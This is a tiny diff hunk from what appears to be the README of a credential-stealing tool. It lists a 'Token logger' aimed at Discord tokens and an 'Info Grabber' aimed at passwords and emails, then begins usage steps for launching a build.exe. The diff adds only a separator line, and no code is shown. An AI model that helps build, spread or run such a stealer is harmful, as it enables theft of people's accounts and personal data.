@@ -21,7 +21,7 @@ Token logger - Trargets Discord Tokens.
 Info Grabber - Targets passwords, Emails, Etc.
 
 
-
+-----------------------------------------------------------------------------------
 How to use.
 
 1. Lunch the build.exe in the zip file.
